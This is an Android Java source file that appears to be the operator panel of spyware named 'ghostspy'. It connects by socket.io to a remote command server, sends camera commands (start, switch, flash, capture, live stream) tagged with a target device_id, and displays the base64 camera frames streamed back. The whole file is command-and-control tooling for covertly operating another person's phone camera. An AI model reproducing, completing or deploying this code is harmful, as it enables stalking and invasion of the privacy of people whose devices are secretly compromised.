package com.testapp;

import android.app.Activity;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Handler;
import android.util.Base64;
import android.view.Gravity;
import android.view.View;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;
import java.util.Locale;

public class CameraActivity extends Activity {
    private Socket socket;
    private String deviceId;
    private ImageView cameraView;
    private TextView timerText, statusBadge, infoPanel;
    private Button switchBtn, flashBtn, liveBtn, captureBtn;
    private Handler timerHandler = new Handler();
    private long startTime = 0;
    private boolean isLive = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        deviceId = getIntent().getStringExtra("deviceId");

        // Root layout
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF0B0B0B);
        setContentView(root);

        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setBackgroundColor(0xFF181818);
        header.setPadding(16, 12, 16, 12);
        root.addView(header);

        Button backBtn = new Button(this);
        backBtn.setText("←");
        backBtn.setTextColor(0xFFFFFFFF);
        backBtn.setBackgroundColor(0x00000000);
        backBtn.setOnClickListener(v -> finish());
        header.addView(backBtn);

        TextView title = new TextView(this);
        title.setText("Camera Live Stream");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(18);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        title.setLayoutParams(titleParams);
        header.addView(title);

        statusBadge = new TextView(this);
        statusBadge.setText("● ONLINE");
        statusBadge.setTextColor(0xFF00E676);
        statusBadge.setTextSize(12);
        statusBadge.setPadding(8, 4, 8, 4);
        statusBadge.setBackground(getDrawable(R.drawable.card_admin));
        header.addView(statusBadge);

        // Preview kamera
        cameraView = new ImageView(this);
        cameraView.setBackgroundColor(0xFF000000);
        LinearLayout.LayoutParams camParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0);
        camParams.weight = 1;
        cameraView.setLayoutParams(camParams);
        cameraView.setScaleType(ImageView.ScaleType.FIT_CENTER);
        root.addView(cameraView);

        // Panel info
        infoPanel = new TextView(this);
        infoPanel.setText("Kamera: Depan | Res: 1080p | FPS: 30");
        infoPanel.setTextColor(0xFFFFFFFF);
        infoPanel.setBackgroundColor(0x99000000);
        infoPanel.setPadding(12, 8, 12, 8);
        root.addView(infoPanel);

        // Timer & badge LIVE
        LinearLayout liveBar = new LinearLayout(this);
        liveBar.setOrientation(LinearLayout.HORIZONTAL);
        liveBar.setGravity(Gravity.CENTER_VERTICAL);
        liveBar.setPadding(16, 8, 16, 8);

        timerText = new TextView(this);
        timerText.setText("00:00:00");
        timerText.setTextColor(0xFFFFFFFF);
        timerText.setTextSize(18);
        liveBar.addView(timerText);

        TextView liveBadge = new TextView(this);
        liveBadge.setText("🔴 LIVE");
        liveBadge.setTextColor(0xFFFF1744);
        liveBadge.setTextSize(12);
        liveBadge.setPadding(8, 4, 8, 4);
        liveBadge.setBackgroundColor(0x22000000);
        liveBadge.setVisibility(isLive ? View.VISIBLE : View.GONE);
        liveBar.addView(liveBadge);

        root.addView(liveBar);

        // Toolbar kontrol
        LinearLayout toolbar = new LinearLayout(this);
        toolbar.setOrientation(LinearLayout.HORIZONTAL);
        toolbar.setGravity(Gravity.CENTER);
        toolbar.setPadding(16, 12, 16, 12);
        toolbar.setBackgroundColor(0x99000000);

        switchBtn = createToolBtn("📷");
        switchBtn.setOnClickListener(v -> sendCmd("switch_camera"));
        toolbar.addView(switchBtn);

        flashBtn = createToolBtn("🔦");
        flashBtn.setOnClickListener(v -> sendCmd("toggle_flash"));
        toolbar.addView(flashBtn);

        liveBtn = createToolBtn("📹");
        liveBtn.setOnClickListener(v -> toggleLive());
        toolbar.addView(liveBtn);

        captureBtn = createToolBtn("📸");
        captureBtn.setOnClickListener(v -> sendCmd("capture_camera"));
        toolbar.addView(captureBtn);

        root.addView(toolbar);

        // Mulai socket & minta frame
        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}

        socket.on("camera_frame", args -> {
            try {
                String b64 = (String) args[0];
                byte[] img = Base64.decode(b64, Base64.DEFAULT);
                Bitmap bmp = BitmapFactory.decodeByteArray(img, 0, img.length);
                runOnUiThread(() -> cameraView.setImageBitmap(bmp));
            } catch (Exception e) {}
        });

        sendCmd("start_camera");
    }

    private Button createToolBtn(String icon) {
        Button btn = new Button(this);
        btn.setText(icon);
        btn.setTextColor(0xFFFFFFFF);
        btn.setBackground(getDrawable(R.drawable.card_admin));
        btn.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(72, 72);
        params.setMargins(4, 4, 4, 4);
        btn.setLayoutParams(params);
        return btn;
    }

    private void toggleLive() {
        isLive = !isLive;
        if (isLive) {
            startTime = System.currentTimeMillis();
            timerHandler.post(timerRunnable);
            liveBtn.setText("⏹");
            sendCmd("start_live");
        } else {
            timerHandler.removeCallbacks(timerRunnable);
            timerText.setText("00:00:00");
            liveBtn.setText("📹");
            sendCmd("stop_live");
        }
    }

    private Runnable timerRunnable = new Runnable() {
        @Override
        public void run() {
            long elapsed = System.currentTimeMillis() - startTime;
            int sec = (int) (elapsed / 1000) % 60;
            int min = (int) (elapsed / 60000) % 60;
            int hour = (int) (elapsed / 3600000);
            timerText.setText(String.format(Locale.US, "%02d:%02d:%02d", hour, min, sec));
            timerHandler.postDelayed(this, 1000);
        }
    };

    private void sendCmd(String cmd) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", new JSONObject());
                socket.emit("command", msg);
            } catch (Exception e) {}
        }
    }

    @Override
    protected void onDestroy() {
        sendCmd("stop_camera");
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
